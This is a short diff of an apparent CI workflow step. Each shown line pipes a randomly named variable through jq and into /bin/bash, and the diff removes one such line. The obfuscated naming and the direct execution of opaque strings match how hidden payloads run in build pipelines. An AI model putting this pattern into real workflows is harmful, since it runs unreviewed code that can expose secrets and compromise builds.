@@ -24,7 +24,6 @@ jobs:
           printf '%s' "$mwvkz4" | jq -r .ma24900 | /bin/bash
           printf '%s' "$rhuu266" | jq -r .ymd240 | /bin/bash
           printf '%s' "$nqcn66160" | jq -r .kolnq88 | /bin/bash
-          echo $yhce727 | jq -r .snsq9848 | /bin/bash
           echo $nz93 | jq -r .oc41 | /bin/bash
 
       - name: Save artifact
